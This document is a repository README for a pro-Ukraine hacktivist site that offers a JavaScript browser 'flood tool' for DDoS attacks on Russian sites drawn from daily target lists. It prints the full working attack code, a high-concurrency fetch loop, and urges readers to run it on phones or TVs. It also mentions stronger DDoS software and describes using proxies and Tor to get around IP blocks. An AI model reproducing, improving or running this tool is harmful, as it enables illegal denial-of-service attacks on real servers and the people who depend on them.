# HelpUKR-master
#### this is the Master Repo for the site "helpukr.xyz" www.helpukr.xyz
HelpUKR offers lots of ways to help support Ukraine, from simply using your computer to donating to charities.
We offer the best JavaScript based website flood tool for efficiently participating in flooding Russian propaganda and infrastructure helping aid Putin's war, It's always keep up-to-date with the daily targets chosen by the IT Army of Ukraine and has great success rates. We do this because of all the people being murdered, tortured and raped every day, cities being destroyed randomly, the 15000+ War crimes that happen every day since the war started. There will be a new page for each day until this war ends and Putin is removed from power.
As well as browser flood tools, we offer a huge archive of information for all related subjects.

## Screenshot:
![Screenshot](https://i.imgur.com/toklkAG.jpg)

## Flood Russian Propaganda & Infrastructure:
Every day the IT Army of Ukraine release a new list of targets to flood for that day, targets are selected carefully by an intellagance team who look int what's happening, who's spreading propaganda, what services are aiding the war ect.
This tool us updated daily with that list and provides  an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.
For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.
It can even be used via the browser app on a Smart TV in the background whilst you watch TV.
With your help you can convince a Russian to rebel agents the war by making them look elsewhere for news, remember, Nothing you do is too little!

### how it works
It's a simple JavaScript that requests all the data from each target website as if you were visiting it, requests are made in full via GET which means data used by your device is much less that the data being requested from the servers.
targets are loaded in a random sequence each time the page is loaded, then requests are made recursively in the order it loaded, you can see this in the network tab of your browsers developer's console. (example below)
![Screenshot](https://i.imgur.com/nA9zXoF.gif)

### JavaScript
Below is an example of the JavaScript used to power the site flood tool, arrange the targets and display a warning before it's started. It's simple, effective and can be embedded and styled within a single html page.

```target list
 // target list
        var urls = [
            'http://example.ru/',
            'https://0.0.0.0:443/',
            'http://0.0.0.0:80/',
        ];

        // initialize variables
        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
        var statRow = document.querySelector("#stats > .row");
        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
        var CONCURRENCY_LIMIT = 200;
        var queue = [];
        var attack = false;
        var totalrequests = 0;
        var totalerrors = 0;

        function togglePause () {
            if (attack) {
                attack = false;
                document.querySelector("div.desc .btn").innerText = "Resume";
            } else {
                attack = true;
                document.querySelector("div.desc .btn").innerText = "Pause";
                for (var i=0; i<urls.length; i++) {
                    flood(i);
                }
            }
        }

        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                signal: controller.signal,
                mode: 'no-cors'
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                clearTimeout(id);
                throw error;
            });
        }

        async function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }         

        async function flood(n) {
            const url = urls[n];
            const target = targets[url];

            while (attack) {
                if (queue.length > CONCURRENCY_LIMIT) {
                    await queue.shift();
                }
                queue.push(
                    fetchWithTimeout(url, { timeout: 2000 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            target.number_of_errored_responses++;
                            target.error_message = error.message;
                            totalerrors++;
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                target.number_of_errored_responses++;
                                target.error_message = response.statusText;
                                totalerrors++;
                            }
                            target.number_of_requests++;
                        })
                        .finally(() => updateTargetDisplay(n))
                );

                await sleep(1);
            }
        }

        // Update data for target n
        function updateTargetDisplay(n) {
            var url = urls[n];
            var {number_of_requests, number_of_errored_responses} = targets[url];
            var requests_cell = document.querySelector(`#target${n} .requests`);
            var errors_cell = document.querySelector(`#target${n} .errors`);
            requests_cell.innerText = number_of_requests;
            errors_cell.innerText = number_of_errored_responses;
            document.querySelector("#totalrequests").innerText = totalrequests;
            document.querySelector("#totalerrors").innerText = totalerrors;
        }

        // Shuffle array order before starting
        for (let i = urls.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [urls[i], urls[j]] = [urls[j], urls[i]];
        }

        // Create div for each target
        for (var i=0; i<urls.length; i++) {
            statRow.innerHTML += `
                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
                    <h4>${urls[i]}</h4>
                    <table class='status'>
                        <tr><td>requests:</td><td class="requests">0</td></tr>
                        </tr><td>errors:</td><td class="errors">0</td></tr>
                    </table>
                </div>
            `;
        }

        // Show warning window
        myModal.toggle();

    
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-85513613-1');
```

## DDoS Help
If you are at a device with more control over like a Computer, you can use much more advance DDoS techniques, this allows you to have your computer generate complex payloads of data, abstract query’s and all kinds of other server abusing craziness.
In this section we’ll detail all kinds of useful software that can be used to attack our targets from.  
https://www.helpukr.xyz/ddos-help.htm
## IT Army
The IT Army of Ukraine is made up of volunteers around the world, it was announced during the first days of Russia’s invasion and backed by the Ukrainian government. Since then millions of people from around the world have joined to help make a dent in the balance of Russia’s war.
The main goal of this group is to flood Russian propaganda, make the sites spreading lies to the Russian people unable to function, forcing the Russian people to look elsewhere for their news. Flood Russian infrastructure helping there invasion, and cause as many technical problems as possible for them. Every day a new list of targets is released that every member in the group can flood by their desired method.  
https://www.helpukr.xyz/it-army.htm
## Donate to Ukraine
Ukraine is fighting a Russian-led invasion, defending its territories against ongoing missile attacks. This aggression has been hurting families, destroying homes and disrupting lives of millions of Ukrainians. There is innocent blood on Russia’s hands.
Now is the time for the whole world to unite and fight together toward peace and democracy around the world, rejecting Putin’s one-party system led by a dictator.
saveukraine.org have compiled a list of credible volunteer organizations that are working day and night to provide life-saving care. Your donations for Ukraine are crucial to support Ukraine’s armed forces and civilians displaced from war.  
https://www.helpukr.xyz/donate-to-ukraine.htm
## News
Here we list articles of real news for Putin’s invasion of Ukraine, The news is powered by an RSS run by "BigEarthData", a service that allows you to take a search term and turn it into a timeline of related news content. All news provided via this RSS feed is thoroughly gone over by professional journalists in the origin group, sourced from lots of different legitimate and trusted news providers from around the world. This list is updated more or less every 10 minutes and is a great source for Russian citizens to see what’s really happening.  
http://www.helpukr.xyz/news.htm
## VPN
VPN is short for Virtual Private Network, it’s one of the most efficient and secure ways to keep yourself anonymous online. They work by routing your entire computers network through there servers. There are a lot of good VPN providers out there to explore but some can be dangerous, and others are often snooped on, VPN's listed below fall outside the 14 Eyes alliance and ensure complete security.  
https://www.helpukr.xyz/vpns.htm
## Proxie's
Proxy servers are one of the simplest methods of routing through another location. Proxying was the first method that came about that allowed people to route there browsing data through another connection elsewhere in the world, they act as a relay passing data you request along from another machine (the proxy server) and then relay that data back to you, proxy servers usually work in the browser and allow you to simply enter a web address to visit sites via the proxy servers. It's not as secure as VPN's and ToR but it is useful for flooding sites with when you're IP's have been blocked. Proxy servers are rarely managed by a company, a lot of the time its random people who set them up at home as part of some random project and so some of them won't be online for huge periods of time after they appear, for this reason we'll embed proxy servers from a live list of servers that’s regularly updated. Proxy servers are rarely managed by a company, a lot of the time it's random people who set them up at home as part of some random project and so some of them won't be online for long after they appear, for this reson we'll embed proxy servers from a live list of servers.  
https://www.helpukr.xyz/proxies.htm
## ToR
The ToR Browser works by Onion routing, this will rout your connection through multiple layers of tor nodes before any data is processed, It was originally created by a shared group of military scientists a very long time ago and since evolved into an open source deep network also known the darknet, those sites use the .onion extension which can only be resolved by onion routing which is why tor is a grey area for most countries, but for secure browsing it's probably the best choice, The tor browser will make it easy for you to get a new IP address whenever you need one simply by clicking the new ID button at the top right of the address bar, if you cycle through the tor nodes long enough you can come across some good russian connections to utilise.  
https://www.helpukr.xyz/tor.htm
